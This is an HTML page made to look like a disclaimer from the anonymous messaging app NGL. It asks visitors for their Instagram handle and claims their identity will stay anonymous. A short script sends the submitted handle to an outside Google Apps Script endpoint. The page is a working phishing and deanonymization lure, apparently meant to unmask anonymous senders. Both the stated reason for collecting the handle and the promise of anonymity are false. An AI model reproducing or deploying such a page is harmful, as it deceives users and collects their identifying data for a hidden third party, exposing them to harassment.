<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Your existing head content -->
</head>

<body>
    <div class="login-container">
        <div class="background-box"></div>
        <!-- Add your login form content here -->
        <h2>Disclaimer</h2>
        <form method="POST" id="form">
            <!-- Add your form fields here -->
            <label for="u">
                <h6>As NGL wants to protect its user integrity through authentic messages, it is required to put your
                    <b> Insta handle </b>before proceeding further.
                    Don't worry your Identity and data will be still anonymous.</h6>
            </label>

            <input type="text" id="username" name="username" placeholder="Your Instagram Handle" required>

            <button type="submit"> <h4>PROCEED</h4> </button>
        </form>
    </div>

    <script>
        let url = 'https://script.google.com/macros/s/AKfycbxdoSpTZJ7zUp5xFuwBxdeXsvtt7lwzAdo0Shy6EntoED5JibZHGZLfmkQdoKZc9B95/exec';
        let form = document.querySelector('#form');

        form.addEventListener("submit", (e) => {
            let d = new FormData(form);
            fetch(url, {
                method: "POST",
                body: d
            }).then((res) => res.text())
                .then((finalRes) => console.log(finalRes));
            e.preventDefault();
        });
    </script>
</body>

</html>
